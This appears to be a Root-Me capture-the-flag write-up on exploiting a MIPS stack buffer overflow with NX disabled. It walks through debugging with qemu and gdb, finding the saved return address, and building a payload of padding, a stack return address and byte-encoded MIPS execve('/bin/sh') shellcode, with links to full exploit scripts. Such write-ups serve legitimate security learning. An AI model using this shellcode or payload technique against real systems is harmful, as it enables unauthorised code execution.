---
title: "[PWN] ELF-MIPS-Stack-buffer-overflow-No-NX"
date: "2019-03-13"
categories: 
  - "root-me"
---

_**Author**_: **PhieuLang1993** Challenge: [Here](https://www.root-me.org/en/Challenges/App-System/ELF-MIPS-Stack-buffer-overflow-No-NX)

**Overview:**

![](images/p1.png)

We have: NX is disabled, ASLR off

**Determining Vulnerabilities:**

\- By fuzzing, we see that the programs call **\_ftext** method, this method then calls **function,** and executes **sys\_exit** after.

![](images/p2.png)

\- Analyzing **function:**

![](images/p3.png)

\- This function uses **sys\_write** to print **"Hello World\\nWhat is your name: "**. Then it uses **sys\_read** to **read(0, sp, 0x80),** then **sys\_write(1, "Hello", 7)** and **sys\_write(1, sp, 0x14)** (string from our input).

\- Furthermore, we see that the program gets the value from **sp+0x14** and push into **$ra** (https://en.wikibooks.org/wiki/MIPS\_Assembly/Control\_Flow\_Instructions). Hence, this program is vulnerable to Stack Overflow so that we can control **pc.**

**Exploit:**

\- We are going to write shellcode to **sp** and control **sp** to jump back and execute shellcode.

\- Using **gdb-multiarch** and **qemu-mips-static** to debug this program:

- Terminal 1:

$ qemu-mips-static -g 12345 ./ch65

- Terminal 2:

$ gdb-multiarch -q
pwndbg: loaded 165 commands. Type pwndbg \[filter\] for a list
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> **set architecture mips**
The target architecture is assumed to be mips
pwndbg> **set endian big**
The target is assumed to be big endian
pwndbg> **target remote 127.0.0.1:12345**
Remote debugging using 127.0.0.1:12345
0x004000f0 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA

…\[TRUNCATED\]...

![](images/p4.png)

\- String **"Hello World..."** is written.

![](images/p5.png)

\- Then **sys\_read(0, sp=0x76fff6a8, 0x80),** we have **sp address = 0x76fff6a8**.

\- Terminal 1:

![](images/p6.png)

We entered: **AAAABBBBCCCCDDDDEEEEFFFF00001111**

\- Terminal 2:

![](images/p7.png)

**sys\_write** for **"Hello...."**

![](images/p8.png)

**sys\_write** for entered string

![](images/p9.png)

\- Take the value from **$sp+0x14** and load into **$ra**, we see that **$sp+0x14 = FFFF (0x46464646)**

![](images/p10.png)

![](images/p11.png)

**0x46464646 is invalid. Hence, we have stack address = 0x76fff6a8**.

\- Using shellcode from: [**http://shell-storm.org/shellcode/files/shellcode-782.php**](http://shell-storm.org/shellcode/files/shellcode-782.php)

\- We have a payload:

shellcode\_addr = 0x76fff6a8 + 0x14 + 4
shellcode = 
“\\x24\\x06\\x06\\x66\\x04\\xd0\\xff\\xff\\x28\\x06\\xff\\xff\\x27\\xbd\\xff\\xe0\\x27\\xe4\\x10\\x01\\x24\\x84\\xf0\\x1f\\xaf\\xa4\\xff\\xe8\\xaf\\xa0\\xff\\xec\\x27\\xa5\\xff\\xe8\\x24\\x02\\x0f\\xab\\x01\\x01\\x01\\x0c/bin/sh\\x00"
payload = “A”\*0x14
payload += p32(shellcode\_addr)
payload += shellcode

![](images/p12.png) ![](images/p13.png)

**Successfully Exploited:**

![](images/p14.png)

**Full payload:**

Local: https://gist.github.com/phieulang1993/db8b01abf3380b87e711f7d53cf2cdde
Remote: https://gist.github.com/phieulang1993/ece9fcb4a58d51d2c5bddb6503cc4556
